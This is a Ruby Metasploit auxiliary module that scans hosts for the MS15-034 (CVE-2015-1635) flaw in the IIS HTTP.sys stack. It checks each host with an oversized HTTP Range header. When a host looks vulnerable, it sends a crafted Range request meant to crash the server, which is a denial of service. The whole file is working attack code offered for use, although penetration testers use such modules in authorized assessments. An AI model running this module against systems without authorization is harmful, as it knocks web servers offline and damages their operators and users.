##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  # Watch out, dos all the things
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'MS15-034 HTTP Protocol Stack Request Handling Denial-of-Service',
      'Description'    => %q{
        This module will check if scanned hosts are vulnerable to CVE-2015-1635 (MS15-034), a
        vulnerability in the HTTP protocol stack (HTTP.sys) that could result in arbitrary code
        execution. This module will try to cause a denial-of-service.

        Please note that a valid file resource must be supplied for the TARGETURI option.
        By default, IIS provides 'welcome.png' and 'iis-85.png' as resources.
        Others may also exist, depending on configuration options.
      },
      'Author'         =>
        [
          # Bill did all the work (see the pastebin code), twitter: @hectorh56193716
          'Bill Finlayson',
          # MSF. But really, these people made it happen:
          # https://github.com/rapid7/metasploit-framework/pull/5150
          'sinn3r'
        ],
      'References'     =>
        [
          ['CVE', '2015-1635'],
          ['MSB', 'MS15-034'],
          ['URL', 'http://pastebin.com/ypURDPc4'],
          ['URL', 'https://github.com/rapid7/metasploit-framework/pull/5150'],
          ['URL', 'https://community.qualys.com/blogs/securitylabs/2015/04/20/ms15-034-analyze-and-remote-detection'],
          ['URL', 'http://www.securitysift.com/an-analysis-of-ms15-034/']
        ],
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'A valid file resource', '/welcome.png'])
      ], self.class)

    deregister_options('RHOST')
  end

  def upper_range
    0xFFFFFFFFFFFFFFFF
  end

  def run_host(ip)
    if check_host(ip) == Exploit::CheckCode::Vulnerable
      dos_host(ip)
    else
      print_status("#{ip}:#{rport} - Probably not vulnerable, will not dos it.")
    end
  end

  def get_file_size(ip)
    @file_size ||= lambda {
      file_size = -1
      uri = normalize_uri(target_uri.path)
      res = send_request_raw({'uri'=>uri})

      unless res
        vprint_error("#{ip}:#{rport} - Connection timed out")
        return file_size
      end

      if res.code == 404
        vprint_error("#{ip}:#{rport} - You got a 404. URI must be a valid resource.")
        return file_size
      end

      file_size = res.body.length
      vprint_status("#{ip}:#{rport} - File length: #{file_size} bytes")

      return file_size
    }.call
  end


  def dos_host(ip)
    file_size = get_file_size(ip)
    lower_range = file_size - 2

    # In here we have to use Rex because if we dos it, it causes our module to hang too
    uri = normalize_uri(target_uri.path)
    begin
      cli = Rex::Proto::Http::Client.new(ip)
      cli.connect
      req = cli.request_raw({
        'uri' => uri,
        'method' => 'GET',
        'headers' => {
          'Range' => "bytes=#{lower_range}-#{upper_range}"
        }
      })
      cli.send_request(req)
    rescue ::Errno::EPIPE, ::Timeout::Error
      # Same exceptions the HttpClient mixin catches
    end
    print_status("#{ip}:#{rport} - DOS request sent")
  end


  def check_host(ip)
    return Exploit::CheckCode::Unknown if get_file_size(ip) == -1

    uri = normalize_uri(target_uri.path)
    res = send_request_raw({
      'uri' => uri,
      'method' => 'GET',
      'headers' => {
        'Range' => "bytes=0-#{upper_range}"
      }
    })
    if res && res.body.include?('Requested Range Not Satisfiable')
      return Exploit::CheckCode::Vulnerable
    elsif res && res.body.include?('The request has an invalid header name')
      return Exploit::CheckCode::Safe
    else
      return Exploit::CheckCode::Unknown
    end
  end

end
